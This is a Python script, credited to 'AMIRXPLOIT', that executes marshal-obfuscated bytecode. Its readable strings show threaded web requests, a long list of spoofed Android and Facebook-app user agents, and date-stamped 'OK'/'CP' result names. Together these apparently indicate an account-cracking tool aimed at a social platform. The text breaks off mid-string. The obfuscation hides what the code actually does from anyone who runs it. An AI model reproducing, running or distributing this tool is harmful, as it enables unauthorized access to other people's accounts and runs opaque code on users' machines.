#Compiled By AMIRXPLOIT
#https://github.com/AMIRXPLOID
import marshal
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\x00\x00\x00@\x00\x00\x00sf\x03\x00\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x02Z\x02d\x00d\x01l\x03Z\x03d\x00d\x01l\x04Z\x04d\x00d\x01l\x05Z\x05d\x00d\x01l\x06Z\x06d\x00d\x01l\x07Z\x07d\x00d\x01l\x08Z\x08d\x00d\x01l\tZ\tz\x06d\x00d\x01l\nZ\nW\x00n\'\x04\x00e\x0byU\x01\x00\x01\x00\x01\x00e\x03\xa0\x0cd\x02\xa1\x01\x01\x00e\x07\xa0\rd\x03\xa1\x01\x01\x00z\x06d\x00d\x01l\nZ\nW\x00n\r\x04\x00e\x0byR\x01\x00\x01\x00\x01\x00e\x0ed\x04\x83\x01\x01\x00Y\x00n\x01w\x00Y\x00n\x01w\x00d\x00d\x05l\x0fm\x10Z\x11\x01\x00d\x00d\x06l\x12m\x13Z\x14\x01\x00d\x00d\x07l\x01m\x15Z\x16\x01\x00d\x00d\x08l\x17m\x18Z\x19\x01\x00d\x00d\tl\x12m\x1aZ\x1b\x01\x00d\x00d\nl\x1cm\x1dZ\x1e\x01\x00d\x00d\x01l\x1fZ\x1fd\x00d\x0bl\nm Z!\x01\x00d\x00d\x0cl"m#Z$\x01\x00d\x00d\rl%m&Z\'\x01\x00d\x0eg\x01Z(d\x0fg\x01Z)g\x00d\x10\xa2\x01Z*g\x00g\x00d\x00d\x00d\x00g\x00g\x00g\x00g\x00g\x00g\x00g\x00g\x00f\r\\\rZ+Z,a-a.a/Z0Z1Z2Z3Z4Z5Z6Z7d\x11Z8d\x12Z9d\x13Z:d\x14Z;d\x15Z<d\x13Z=d\x16Z>d\x17Z?d\x18Z@d\x19ZAd\x1aZBd\x1bd\x1ci\x01ZCd\x1dd\x1ed\x1fd d!d"d#d$d%d&d\'d(d)\x9c\x0cZDd\x1dd\x1ed\x1fd d!d"d#d$d%d&d\'d(d*\x9c\x0cZEd+ZFd,ZGd-ZHd.ZId/\\\x04ZJZKZLZMd0\\\x04ZNZOZPZQd1\\\x03ZRZSZTd2ZUd3ZVd4ZWe\x06j\x06\xa0X\xa1\x00jYZZeDe[e\x06j\x06\xa0X\xa1\x00j\\\x83\x01\x19\x00Z]e\x06j\x06\xa0X\xa1\x00j^Z_d5e[eZ\x83\x01\x17\x00d6\x17\x00e[e]\x83\x01\x17\x00d6\x17\x00e[e_\x83\x01\x17\x00d7\x17\x00Z`d8e[eZ\x83\x01\x17\x00d6\x17\x00e[e]\x83\x01\x17\x00d6\x17\x00e[e_\x83\x01\x17\x00d7\x17\x00Zad9d:\x84\x00Zbd;d<\x84\x00Zcd=d>\x84\x00Zdd?d@\x84\x00ZedAdB\x84\x00ZfdCdD\x84\x00ZgdEdF\x84\x00ZhdGdH\x84\x00ZidIdJ\x84\x00ZjdKdL\x84\x00ZkdMdN\x84\x00ZldOdP\x84\x00ZmdQdR\x84\x00ZndSdT\x84\x00ZodUdV\x84\x00ZpdWdX\x84\x00ZqdYdZ\x84\x00Zresd[k\x02\x90\x01r\xb1z\x07e\x03\xa0td\\\xa1\x01\x01\x00W\x00n\x04\x01\x00\x01\x00\x01\x00Y\x00z\x07e\x03\xa0td]\xa1\x01\x01\x00W\x00n\x04\x01\x00\x01\x00\x01\x00Y\x00ee\x83\x00\x01\x00d\x01S\x00d\x01S\x00)^\xe9\x00\x00\x00\x00Nz\x10pip install rich\xe9\x01\x00\x00\x00zKTidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich))\x01\xda\x05Table)\x01\xda\x07Console)\x01\xda\rBeautifulSoup)\x01\xda\x12ThreadPoolExecutor)\x01\xda\x05Group)\x01\xda\x05Panel)\x01\xda\x05print)\x01\xda\x08Markdown)\x01\xda\x07Columnsz\xb7Mozilla/5.0 (Linux; Android 10; JNY-LX1; HMSCore 6.4.0.312; GMSCore 21.06.12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.3.314 Mobile Safari/537.36z\xaeMozilla/5.0 (Linux; Android 4.4.4; One Build/KTU84L.H4) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/28.0.0.20.16(\r\x01\x00\x00z\x8eMozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Safari/537.36zzMozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36z\x82Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x82Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x82Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36u \x00\x00\x00Mozilla/5.0 (Linux; Android 1\xe2\x80\xa6z\xa3[18.36, 15/3/2022] AOREC: Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36z~Mozilla/5.0 (Linux; Android 11; en-au; SCV45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x86Mozilla/5.0 (Linux; Android 11; en-au; en-au; SC-04L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x97Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N980F/N980FXXU1DUB5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x92Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N/KSU1FUCD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x8aMozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x98Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-G988B/G988BXXU7DUC7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x8aMozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-A8050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x87Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG IN2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x7fMozilla/5.0 (Linux; Android 10; en-au; SC-42A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x82Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T597W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36z\x97Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x99Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600FN/A600FNXXU6CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x97Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515F/A515FXXU2ATB1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\xa4Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN 6/128) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36z\x82Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A013F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x88Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N935S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x88Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M205G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J530GM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x96Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A530F/A530FXXU4CSC6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x84Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T835) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36\xfa\x9aMozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRK3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36r\x0c\x00\x00\x00z\x98Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935F/G935FXXS2DRAA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x93Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G920K/KKS3ETJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x8cMozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-C9000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36\xfa\x81Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36r\r\x00\x00\x00z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36\xfa\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36r\x0e\x00\x00\x00z\x8aMozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x8aMozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J720M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36zyMozilla/5.0 (Linux; Android 10; en-au; Pixel C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36z\x7fMozilla/5.0 (Linux; Android 10; en-au; NX659J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x88Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A102U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x8aMozilla/5.0 (Linux; Android 8.0; en-au; SAMSUNG SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x8dMozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-G550FY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x8aMozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-N9200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x81Mozilla/5.0 (Linux; Android 7.0; en-au; FRD-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z\x81Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-T870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36z\x81Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P615) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x97Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F/N970FXXS6EUA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36\xfa\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36\xfa\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36\xfa\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-F700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x80Mozilla/5.0 (Linux; Android 11; en-au; CPH2009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x97Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G980F/G980FXXU3ATFG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x88Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36z\x97Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G973F/G973FXXS3BSL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x97Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F/G960FXXSDFTL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x92Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A908N/KSU3CTL3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x99Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS6BUA5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x88Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36z\x88Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36\xfa\x9aMozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J710F/J710FXXS6CTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36\xfa\x8dMozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J327R6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36\xfa\x9cMozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J330FN/J330FNXXU3BRL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x9aMozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXU3BRL8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36\xfa\x9aMozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXS3BRH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36\xfa\x8aMozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J327U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36r\x12\x00\x00\x00r\x13\x00\x00\x00r\x14\x00\x00\x00r\x15\x00\x00\x00r\x16\x00\x00\x00z\x9cMozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-J320FN/J320FNXXU0ARE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36r\x0f\x00\x00\x00r\x10\x00\x00\x00z\x8aMozilla/5.0 (Linux; Android 11 en-au;; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36r\x11\x00\x00\x00z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x97Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F/A515FXXU4DUB2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x88Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T725) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x8aMozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S111DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x8aMozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x92Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965N/KSU3FTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-F700U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x97Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXS3BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x99Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXS4BTG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x81Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-T827V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36z\x88Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J260A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A307GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x88Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x91Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T585/T585XXS5CSH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36z\x8cMozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x93Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G925K/KKU3ERG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z\x84Mozilla/5.0 (Linux; Android 5.0.2; en-au; SAMSUNG SM-P905) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36\xfa\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x8aMozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x81Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z\x82Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T307U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x8aMozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x99Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A405FN/A405FNXXS3BTI3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x88Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36z\x87Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36z\x98Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J330FN/J330FNXXU4CTH2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x96Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G950F/G950FXXSBDUA3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x88Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36z\x8cMozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x8cMozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x9aMozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXUGCTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x8bMozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935W8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x8aMozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-C7000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x98Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A310F/A310FXXS5CTK1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x85Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-T805M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z\x8bMozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36z\x88Mozilla/5.0 (Linux; 